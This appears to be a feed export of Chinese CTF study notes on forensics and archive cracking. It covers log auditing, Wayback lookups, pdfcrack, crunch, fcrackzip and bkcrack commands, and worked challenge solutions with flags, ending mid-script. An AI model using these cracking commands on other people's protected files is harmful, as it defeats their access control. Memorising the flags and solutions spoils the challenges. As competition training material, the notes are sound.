    <content type="html"><![CDATA[<h1 id="游戏题"><a href="#游戏题" class="headerlink" title="游戏题"></a>游戏题</h1><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="SYC"><a href="#SYC" class="headerlink" title="SYC"></a>SYC</h2><p><img src="/./img/bU8-dk-B9ja6kshI/1731821672102-0b6e1baf-d241-4f8a-aa27-596ffc52fb12-327420.png" alt="1731821672102-0b6e1baf-d241-4f8a-aa27-596ffc52fb12.png"></p><p><img src="/./img/bU8-dk-B9ja6kshI/1731821756899-633b0e6e-cbf7-42ab-9605-ab1732ff0cdf-770618.png" alt="1731821756899-633b0e6e-cbf7-42ab-9605-ab1732ff0cdf.png"></p><p><img src="/./img/bU8-dk-B9ja6kshI/1731821782203-b7c2fe08-03a6-41da-82ea-e04373920eac-182236.png" alt="1731821782203-b7c2fe08-03a6-41da-82ea-e04373920eac.png"></p><blockquote><p>更新: 2024-11-17 13:37:23<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/shp2q7ldqz4mfus2">https://www.yuque.com/chaye-apqbl/vsc85q/shp2q7ldqz4mfus2</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%85%B6%E4%BB%96/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/"/>
    <url>/2026/01/19/MISC/%E5%85%B6%E4%BB%96/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h1><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、源码文件泄露"><a href="#1、源码文件泄露" class="headerlink" title="1、源码文件泄露"></a>1、源码文件泄露</h2><p><img src="/./img/49277317_G25MpXD1AbzBt4ON/1722321249994-cd13b7c4-29a1-48ca-9e0f-509150191173-165715.png" alt="1722321249994-cd13b7c4-29a1-48ca-9e0f-509150191173.png"></p><p>打开txt文件搜200（请求成功的日志）</p><p>%2e就是.</p><p>所以泄露的是<a href="http://www.zip文件/">www.zip文件</a></p><p><img src="/./img/49277317_G25MpXD1AbzBt4ON/1722321364029-347f1942-b9eb-42fa-b6f0-100c265edb84-040571.png" alt="1722321364029-347f1942-b9eb-42fa-b6f0-100c265edb84.png"></p><h2 id="2、文件写入"><a href="#2、文件写入" class="headerlink" title="2、文件写入"></a>2、文件写入</h2><p>直接搜索tmp</p><p><img src="/./img/49277317_G25MpXD1AbzBt4ON/1722324414481-6d75ba33-fae0-4bb7-8262-815ec1bde0db-252596.png" alt="1722324414481-6d75ba33-fae0-4bb7-8262-815ec1bde0db.png"></p><p><img src="/./img/49277317_G25MpXD1AbzBt4ON/1722324446316-c616e1d5-e55d-4f7a-bd3e-7671166b3804-520818.png" alt="1722324446316-c616e1d5-e55d-4f7a-bd3e-7671166b3804.png"></p><p>url解码</p><p><img src="/./img/49277317_G25MpXD1AbzBt4ON/1722324466022-f27e543f-7d5d-4526-b9c8-19019f4ad623-352458.png" alt="1722324466022-f27e543f-7d5d-4526-b9c8-19019f4ad623.png"></p><h2 id="3、SQL注入"><a href="#3、SQL注入" class="headerlink" title="3、SQL注入"></a>3、SQL注入</h2><p><img src="/./img/49277317_G25MpXD1AbzBt4ON/1722325421234-97849136-7b73-49e9-a8c4-9c3d87d81059-032676.png" alt="1722325421234-97849136-7b73-49e9-a8c4-9c3d87d81059.png"></p><blockquote><p>更新: 2024-07-30 15:43:50<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gld10dce3lzqxvgu">https://www.yuque.com/chaye-apqbl/vsc85q/gld10dce3lzqxvgu</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%85%B6%E4%BB%96/wayback/"/>
    <url>/2026/01/19/MISC/%E5%85%B6%E4%BB%96/wayback/</url>
    
    <content type="html"><![CDATA[<h1 id="wayback"><a href="#wayback" class="headerlink" title="wayback"></a>wayback</h1><p><a href="https://www.bilibili.com/read/cv6153780/">网页时光机·考古用法介绍 #1：初步认识和基础功能 - 哔哩哔哩 (bilibili.com)</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><img src="/./img/L38edC1tcgi-JEOq/1727346951063-1a5a7462-9d10-4be5-b18d-ea53dd7db981-198372.png" alt="1727346951063-1a5a7462-9d10-4be5-b18d-ea53dd7db981.png"></p><p>找到邮箱</p><p><img src="/./img/L38edC1tcgi-JEOq/1727347184702-0ab929fa-1694-4b07-9f20-b5a73ade0c94-677773.png" alt="1727347184702-0ab929fa-1694-4b07-9f20-b5a73ade0c94.png"></p><blockquote><p>更新: 2024-09-26 18:41:08<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/iuvchzx95vttxnw9">https://www.yuque.com/chaye-apqbl/vsc85q/iuvchzx95vttxnw9</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%85%B6%E4%BB%96/PPTX%E8%A7%A3%E5%AF%86/"/>
    <url>/2026/01/19/MISC/%E5%85%B6%E4%BB%96/PPTX%E8%A7%A3%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="PPTX解密"><a href="#PPTX解密" class="headerlink" title="PPTX解密"></a>PPTX解密</h1><blockquote><p>更新: 2024-11-16 17:33:45<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/unb0vhf075seffll">https://www.yuque.com/chaye-apqbl/vsc85q/unb0vhf075seffll</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%85%B6%E4%BB%96/PDF%E8%A7%A3%E5%AF%86/"/>
    <url>/2026/01/19/MISC/%E5%85%B6%E4%BB%96/PDF%E8%A7%A3%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="PDF解密"><a href="#PDF解密" class="headerlink" title="PDF解密"></a>PDF解密</h1><p><a href="https://smallpdf.com/cn/unlock-pdf#r=result&t=cb132a3b714307af0f6f8ebfe985580a&i=unlock">https://smallpdf.com/cn/unlock-pdf#r=result&amp;t=cb132a3b714307af0f6f8ebfe985580a&amp;i=unlock</a></p><blockquote><p>更新: 2024-11-16 17:33:55<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ps7gqfhovg462hw5">https://www.yuque.com/chaye-apqbl/vsc85q/ps7gqfhovg462hw5</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%85%B6%E4%BB%96/pdfcrack%E7%88%86%E7%A0%B4pdf%E5%AF%86%E7%A0%81/"/>
    <url>/2026/01/19/MISC/%E5%85%B6%E4%BB%96/pdfcrack%E7%88%86%E7%A0%B4pdf%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="pdfcrack-爆破pdf密码"><a href="#pdfcrack-爆破pdf密码" class="headerlink" title="pdfcrack 爆破pdf密码"></a>pdfcrack 爆破pdf密码</h1><p><a href="https://blog.csdn.net/ZL_1618/article/details/136496094">https://blog.csdn.net/ZL_1618&#x2F;article&#x2F;details&#x2F;136496094</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo apt-get update<br><br>sudo apt install pdfcrack<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">pdfcrack -f secret.pdf -n 6 -m 8 -c 0123456789<br><br>-f：选择要破解的pdf文件<br><br>· -n：密码最短多少个字符<br><br>· -m：密码最长多少个字符<br><br>· -c：使用的字符集<br><br>由于密码很简单 长度只有6位 很快就找到了密码 所以建议密码一定设置一个复杂的啊<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">pdfcrack -f secret.pdf -n 1 -m 20 -c 0123456789abcdefghijklmnopqrstuvwxyABCDEFGHIJKLMNOPQRSTUVWXYZ...<br></code></pre></td></tr></table></figure><h5 id="使用字典文件进行爆破"><a href="#使用字典文件进行爆破" class="headerlink" title="使用字典文件进行爆破"></a><font style="color:rgb(79, 79, 79);">使用字典文件进行爆破</font></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">pdfcrack -f secret.pdf -w pass.txt<br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="encrypted-pdf"><a href="#encrypted-pdf" class="headerlink" title="encrypted_pdf"></a><strong>encrypted_pdf</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pdfcrack -f <span class="hljs-number">1.</span>pdf -n <span class="hljs-number">1</span> -m <span class="hljs-number">20</span> -c <span class="hljs-number">0123456789</span>abcdefghijklmnopqrstuvwxyABCDEFGHIJKLMNOPQRSTUVWXYZ<br></code></pre></td></tr></table></figure><p><img src="/./img/ERrlt53tUvH3oERn/1761893886474-d38ef25c-3aef-4051-b603-d655ed5983b3-771622.png" alt="1761893886474-d38ef25c-3aef-4051-b603-d655ed5983b3.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pdfcrack -f <span class="hljs-number">1.</span>pdf -w password.txt<br></code></pre></td></tr></table></figure><p><img src="/./img/ERrlt53tUvH3oERn/1761894105756-87e3a6d5-c593-475b-ba01-edd9bc560c32-506240.png" alt="1761894105756-87e3a6d5-c593-475b-ba01-edd9bc560c32.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">qwe123<br></code></pre></td></tr></table></figure><p>全选复制就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">不知道写什么，那就啊啊啊宝宝你是一个香香软软甜甜糯糯蜂蜜奶油甜甜腻腻酥<br>酥脆脆滑滑嫩嫩番茄炒可乐番茄炒科比草莓蓝莓苹果香蕉葡萄香香甜甜酸酸甜<br>甜辣辣爽爽咸咸鲜鲜苦苦甘甘滑滑嫩嫩酥酥脆脆软软绵绵弹弹润润油油腻腻清<br>清爽爽浓浓醇醇淡淡幽幽热热乎乎冰冰凉凉黏黏糊糊爽爽脆脆鲜鲜嫩嫩辣辣麻<br>苦苦辣辣苹果香蕉橙子草莓葡萄西瓜樱桃菠萝猕猴桃蓝莓桃子梨杏李子西红柿<br>黄瓜胡萝卜生菜菠菜花椰菜卷心菜洋葱大蒜土豆红薯南瓜玉米豌豆扁豆红豆绿<br>豆黄豆黑豆鸡蛋牛奶奶酪酸奶黄油面包面条米饭燕麦玉米片饼干蛋糕油鱼虾蟹<br>龙虾贝类牛肉羊肉猪肉鸡肉鸭肉鹅肉火鸡肉香肠火腿培根肉丸汉堡热狗披萨寿<br>司拉面咖喱炖肉烤肉烤鱼烤鸡沙拉汤粥蒸蛋豆腐豆浆豆奶豆腥草豆皮豆干芒果<br>柠檬柚子金桔百香果火龙果牛油果无花果荔枝龙眼枇杷山楂桑葚甜瓜哈密瓜甜<br>菜根莴苣茼蒿芥蓝芹菜荠菜苋菜意式烤蔬菜配香草酱和橄榄油鲜美多汁香脆可<br>口滑嫩浓郁醇厚甘甜爽口香辣酸甜苦辣咸香酥软糯滑爽劲道鲜美清香扑鼻诱人<br>色泽鲜艳香气扑鼻口感丰富层次分明风味独特香气四溢回味无穷色香味俱佳口<br>感细腻肉质鲜嫩色泽金黄外酥里嫩香气浓郁味道鲜美口感滑嫩味道醇厚味道独<br>特味道浓郁口感丰富味道鲜美味道醇厚味道独特香气扑鼻的………………<br>编不下去了，给你们看图片吧<br>谁不喜欢可可爱爱的 XDSEC 娘啊啊啊啊啊啊<br>moectf&#123;Pdf_1s_r3a1ly_c0lor4ul!!ihdw&#125;<br>啊啊啊求求你了 SEC 娘给我 flag 好不好啊我什么都会做的呜呜呜呜呜呜呜呜呜<br>这里没有 flag 呦（摊手）<br>算了，看在 musc 手这么坐牢的份上给点提示吧，找这题 flag 的方式和入门指<br>北差不多，或者了解一下矢量化 pdf（？<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-10-31 15:05:17<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/qyxchh7cn75mzb8g">https://www.yuque.com/chaye-apqbl/vsc85q/qyxchh7cn75mzb8g</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%85%B6%E4%BB%96/index/"/>
    <url>/2026/01/19/MISC/%E5%85%B6%E4%BB%96/index/</url>
    
    <content type="html"><![CDATA[<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><blockquote><p>更新: 2024-11-13 14:54:39<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/zy4q4olub7g5prwi">https://www.yuque.com/chaye-apqbl/vsc85q/zy4q4olub7g5prwi</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A5/"/>
    <url>/2026/01/19/MISC/zip%E8%A7%A3%E5%AF%86/%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="爆破密钥"><a href="#爆破密钥" class="headerlink" title="爆破密钥"></a>爆破密钥</h1><h1 id="crunch介绍与使用"><a href="#crunch介绍与使用" class="headerlink" title="crunch介绍与使用"></a>crunch介绍与使用</h1><h3 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>crunch是什么？</p><p>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。</p><h3 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h3><p>Kali中已自带crunch工具，可直接在kali中使用。</p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1716614477509-552d4d9e-6a58-423b-b5f4-f395fe0e0b4d-631842.png" alt="1716614477509-552d4d9e-6a58-423b-b5f4-f395fe0e0b4d.png"></p><p>命令格式：</p><p>crunch <min-len>  <max-len>  [<charset string>] [options]</p><p>参数：</p><p>min-len 最小长度字符串，即使不使用参数的值，也需要此选项</p><p>max-len 最大长度字符串，即使不使用参数的值，也需要此选项</p><p>charset string 字符集设置，默认是小写字符集</p><p>options :</p><p>-b     指定文件输出的大小，避免字典文件过大  </p><p>-c     指定文件输出的行数，即包含密码的个数</p><p>-d     限制相同元素出现的次数</p><p>-e     定义停止字符，即到该字符串就停止生成</p><p>-f     调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）</p><p>-i     改变输出格式，即aaa,aab -&gt; aaa,baa</p><p>-I     通常与-t联合使用，表明该字符为实义字符</p><p>-m     通常与-p搭配</p><p>-o     将密码保存到指定文件</p><p>-p     指定元素以组合的方式进行</p><p>-q     读取密码文件，即读取pass.txt</p><p>-r     定义重某一字符串重新开始</p><p>-s     指定一个开始的字符，即从自己定义的密码xxxx开始</p><p>-t     指定密码输出的格式</p><p>-u     禁止打印百分比（必须为最后一个选项）</p><p>-z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z  </p><p>特殊字符，通常与-t配合使用</p><p>%      代表数字</p><p>^      代表特殊符号</p><p>@      代表小写字符</p><p>,      代表大写字符</p><h3 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h3><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">crunch 6 6 123 -o number.txt   &#x2F;&#x2F;生成六位以123元素为组合的字典集，并输出到number.txt</font></p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1716617221789-837ade83-d7c9-48ea-96df-1d4712847746-703542.png" alt="1716617221789-837ade83-d7c9-48ea-96df-1d4712847746.png"></p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1716617240055-ba818cf4-2cf8-424f-9eff-fe2892f3a0c2-831767.png" alt="1716617240055-ba818cf4-2cf8-424f-9eff-fe2892f3a0c2.png"></p><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">crunch 1 1 -q read   &#x2F;&#x2F;读取read文件中每行内容作为基本字符生成字典</font></p><p><font style="color:rgb(77, 77, 77);">read文件内容如下：</font></p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1716617261938-a8369232-d4a5-4511-8a79-861a289f3a44-197466.png" alt="1716617261938-a8369232-d4a5-4511-8a79-861a289f3a44.png"></p><p><font style="color:rgb(77, 77, 77);">生成的字典集结果如下：</font></p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1716617304995-4aa62323-a79f-4dad-a8bb-6623d6934746-470836.png" alt="1716617304995-4aa62323-a79f-4dad-a8bb-6623d6934746.png"></p><h1 id="fcrackzip的使用（爆破）"><a href="#fcrackzip的使用（爆破）" class="headerlink" title="fcrackzip的使用（爆破）"></a>fcrackzip的使用（爆破）</h1><h4 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1. 暴力破解"></a>1. 暴力破解</h4><p>暴力破解适用于不知道密码任何信息的情况。指定字符集和密码长度范围即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">fcrackzip -b -c &lt;字符集&gt; -l &lt;最小长度&gt;-&lt;最大长度&gt; -u &lt;zip文件&gt;<br></code></pre></td></tr></table></figure><ul><li><code>-b</code>：使用暴力破解模式。</li><li><code>-c &lt;字符集&gt;</code>：指定字符集，例如 <code>a</code> 代表小写字母，<code>A</code> 代表大写字母，<code>1</code> 代表数字。</li><li><code>-l &lt;最小长度&gt;-&lt;最大长度&gt;</code>：密码长度范围。</li><li><code>-u</code>：测试解压文件的有效性。</li></ul><p><strong>示例：</strong><br>尝试破解长度为 4 到 5 位的数字密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">fcrackzip -b -c 1 -l 4-5 -u file.zip<br></code></pre></td></tr></table></figure><h4 id="2-字典攻击"><a href="#2-字典攻击" class="headerlink" title="2. 字典攻击"></a>2. 字典攻击</h4><p>字典攻击适用于有密码列表（字典文件）的情况。可以指定字典文件来尝试其中的每个密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">fcrackzip -D -p &lt;字典文件&gt; -u &lt;zip文件&gt;<br></code></pre></td></tr></table></figure><ul><li><code>-D</code>：使用字典攻击模式。</li><li><code>-p &lt;字典文件&gt;</code>：指定密码字典文件的路径。</li></ul><p><strong>示例：</strong><br>使用字典文件 <code>passwords.txt</code> 尝试破解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">fcrackzip -D -p passwords.txt -u file.zip<br></code></pre></td></tr></table></figure><h4 id="3-常用字符集参数"><a href="#3-常用字符集参数" class="headerlink" title="3. 常用字符集参数"></a>3. 常用字符集参数</h4><ul><li><code>a</code>：小写字母（<code>abcdefghijklmnopqrstuvwxyz</code>）</li><li><code>A</code>：大写字母（<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code>）</li><li><code>1</code>：数字（<code>0123456789</code>）</li><li><code>!</code>：符号（例如 <code>!@#$%^&amp;*()</code>）</li></ul><p><strong>示例：</strong><br>尝试小写字母和数字组合，密码长度为 3 到 4 位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">fcrackzip -b -c a1 -l 3-4 -u file.zip<br></code></pre></td></tr></table></figure><h3 id="其他有用的选项"><a href="#其他有用的选项" class="headerlink" title="其他有用的选项"></a>其他有用的选项</h3><ul><li><code>-v</code>：启用详细模式，可以显示破解过程中的进度。</li><li><code>-m</code>：指定压缩方法（0 到 3），通常可以忽略。</li></ul><h3 id="完整示例"><a href="#完整示例" class="headerlink" title="完整示例"></a>完整示例</h3><p>假设我们知道密码是 5 位的小写字母，可以使用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">fcrackzip -b -c a -l 5-5 -u -v file.zip<br></code></pre></td></tr></table></figure><p>这会尝试所有 5 位的小写字母组合，并在找到匹配密码时停止。</p><p>假设我们知道密码是 5 位的小写字母，可以使用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">fcrackzip -b -c a -l 5-5 -u -v file.zip<br></code></pre></td></tr></table></figure><p>这会尝试所有 5 位的小写字母组合，并在找到匹配密码时停止。</p><h1 id="bkcrack命令-明文攻击"><a href="#bkcrack命令-明文攻击" class="headerlink" title="bkcrack命令(明文攻击)"></a>bkcrack命令(明文攻击)</h1><p>4.2恢复内部密钥</p><p>攻击需要至少 12 个字节的已知明文。其中至少 8 个必须是连续的。连续的已知明文越大，攻击速度越快。</p><p>从 zip 档案中加载数据</p><p>拥有一个 zip 档案encrypted.zip，其中条目cipher为密文，plain.zip其中条目plain为已知明文，bkcrack 可以像这样运行：</p><p>bkcrack -C encrypted.zip -c cipher -P plain.zip -p plain</p><p>1</p><p>从文件加载数据</p><p>有了cipherfile包含密文（以加密头对应的 12 个字节开头）和plainfile已知明文的文件，bkcrack 可以像这样运行：</p><p>bkcrack -c cipherfile -p plainfile</p><p>1</p><p>抵消</p><p>如果明文对应的是密文开头以外的部分，可以指定偏移量，如果明文包含加密头的一部分，则可以为负数。</p><p>bkcrack -c cipherfile -p plainfile -o offset</p><p>1</p><p>稀疏明文</p><p>如果您知道少量连续的明文（8 到 11 个字节之间），但知道其他已知偏移量处的某些字节，则可以提供此信息以达到总共 12 个已知字节的要求。为此，请使用标志，-x后跟偏移量和十六进制字节。</p><p>bkcrack -c cipherfile -p plainfile -x 25 4b4f -x 30 21</p><p>1</p><p>解码</p><p>如果攻击成功，则可以保存与用于攻击的密文相关的解密数据：</p><p>bkcrack -c cipherfile -p plainfile -d decipheredfile</p><p>1</p><p>如果从以前的攻击中知道密钥，则可以使用 bkcrack 来解密数据：</p><p>bkcrack -c cipherfile -k 12345678 23456789 34567890 -d decipheredfile</p><p>1</p><p>解压缩</p><p>解密后的数据可能会被压缩，具体取决于创建 zip 文件时是否使用压缩。如果使用了 deflate 压缩，tools则可以使用文件夹中提供的 Python 3 脚本来解压数据。</p><p>python3 tools&#x2F;inflate.py &lt; decipheredfile &gt; decompressedfile</p><p>1</p><p>删除密码</p><p>要通过一个步骤访问加密档案的所有条目，您可以生成一个具有相同内容但不加密的新档案。它假定每个条目最初都使用相同的密码加密。</p><p>bkcrack -C encrypted.zip -k 12345678 23456789 34567890 -D decrypted.zip</p><p>1</p><p>更改密码</p><p>您还可以使用您选择的密码生成一个新的加密档案：</p><p>bkcrack -C encrypted.zip -k 12345678 23456789 34567890 -U unlocked.zip new_password</p><p>1</p><p>您还可以通过其相应的内部表示来定义新密码。</p><p>bkcrack -C encrypted.zip -k 12345678 23456789 34567890 –change-keys unlocked.zip 581da44e 8e40167f 50c009a0</p><p>————————————————</p><pre><code class="hljs">                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。                    </code></pre><p>原文链接：<a href="https://blog.csdn.net/Aluxian_/article/details/143486274">https://blog.csdn.net/Aluxian_&#x2F;article&#x2F;details&#x2F;143486274</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、生日密码"><a href="#1、生日密码" class="headerlink" title="1、生日密码"></a>1、生日密码</h2><p>文件的主人喜欢用生日做密码，而且还是个90后。</p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1715053493021-aed86311-0af2-4eaf-8c25-430469dadb3d-652129.png" alt="1715053493021-aed86311-0af2-4eaf-8c25-430469dadb3d.png"></p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1715053557954-7358c455-a98b-4fc0-8fd6-7fd63cfe0b69-451297.png" alt="1715053557954-7358c455-a98b-4fc0-8fd6-7fd63cfe0b69.png"></p><p>得出密钥（并不是flag哦），要输入密钥打开加密文件得到flag</p><h2 id="2、银行卡密码-键盘密码"><a href="#2、银行卡密码-键盘密码" class="headerlink" title="2、银行卡密码  键盘密码"></a>2、银行卡密码  键盘密码</h2><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1722315081536-c888b8a1-0876-47be-96f5-8d796085285b-730347.png" alt="1722315081536-c888b8a1-0876-47be-96f5-8d796085285b.png"></p><p>猜测只有数字密码（需要猜吗）得到密码</p><p><img src="/./img/49277317_9b5hWqdOsM0puJYO/1722315252325-71248c79-a013-4a84-a67d-347611dba893-579244.png" alt="1722315252325-71248c79-a013-4a84-a67d-347611dba893.png"></p><p>得到第一行为键盘密码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">93 53 63 71 51 63 41 51 83 63 23 23 93 62 61 94 93 71 41 92 41 71 63 41 51 31 83 43 41 21 81 22 21 74 42<br><br>The encryption scheme of next stage is decided by the last  letters.<br><br>T1:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   <span class="hljs-strong">**@@@@**</span><br><br>T2:@@@@@@@@@@@@@@@@@@@@@@@@   <span class="hljs-strong">**@@@@@@@**</span><br><br>T3:@@@@@@@@@@@@@@@@@   <span class="hljs-strong">**@@@@@@@**</span><br><br>T4:@@@@@@@@   <span class="hljs-strong">**@@@@@@ @@@**</span><br><br>NSSCTF&#123;REVERSE(<span class="hljs-strong">**@@@@@@@@**</span>)&#125;<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">str = &#x27;93 53 63 71 51 63 41 51 83 63 23 23 93 62 61 94 93 71 41 92 41 71 63 41 51 31 83 43 41 21 81 22 21 74 42&#x27;<br>table = [&#x27;abc&#x27;,&#x27;def&#x27;,&#x27;ghi&#x27;,&#x27;jkl&#x27;,&#x27;mno&#x27;,&#x27;pqrs&#x27;,&#x27;tuv&#x27;,&#x27;wxyz&#x27;]<br>str = str.split(&#x27; &#x27;)<br>for i in range(len(str)):<br>    print(table[int(str[i][0])-2][int(str[i][1])-1],end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p>得到</p><p>ylopjogjvoccynmzypgxgpogjdvigatbash</p><p>然后用atbash解密一下，得到（要去掉atbash）</p><p>bolkqltqelxxbmnabktctkltqwert</p><p>这一个密码就是 qwert<br>这个是解密的 VBS 脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">Function FromQwerty(str)<br>    Dim d, s, t, i, c, r<br>    s = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;<br>    t = &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot;<br>    Set d = CreateObject(&quot;Scripting.Dictionary&quot;)<br>    For i = 1 To 52<br>        d(Mid(t, i, 1)) = Mid(s, i, 1)<br>    Next<br>    For i = 1 To Len(str)<br>        c = Mid(str, i, 1)<br>        If d.Exists(c) Then<br>            r = r &amp; d(c)<br>        Else<br>            r = r &amp; c<br>        End If<br>    Next<br>    FromQwerty = r<br>End Function<br><br>WScript.Echo 